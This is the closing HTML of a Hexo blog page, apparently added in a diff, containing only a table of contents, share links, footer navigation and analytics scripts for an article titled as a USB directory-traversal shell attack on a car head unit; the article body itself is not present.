+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL%EF%BC%88%E5%90%AB%E6%A8%A1%E6%8B%9F%E7%8E%AF%E5%A2%83%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">U盘目录穿越获取车机SHELL（含模拟环境）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">1.1.</span> <span class="toc-text">目录穿越</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.4.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&text=U盘目录穿越获取车机 SHELL（含模拟环境）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&title=U盘目录穿越获取车机 SHELL（含模拟环境）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&is_video=false&description=U盘目录穿越获取车机 SHELL（含模拟环境）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=U盘目录穿越获取车机 SHELL（含模拟环境）&body=Check out this article: http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&title=U盘目录穿越获取车机 SHELL（含模拟环境）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&title=U盘目录穿越获取车机 SHELL（含模拟环境）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&title=U盘目录穿越获取车机 SHELL（含模拟环境）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&title=U盘目录穿越获取车机 SHELL（含模拟环境）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&name=U盘目录穿越获取车机 SHELL（含模拟环境）&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2021 Delikely
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inicio</a></li>
+         
+          <li><a href="/2018/04/11/about/">Acerca de</a></li>
+         
+          <li><a href="/archives/">Articulos</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Proyectos</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({{ JSON.stringify(config) }});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="{{ src }}">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'G-KX5LMFBRGG', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?4c5298163cee69d0e09ddc06ab1b8104";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
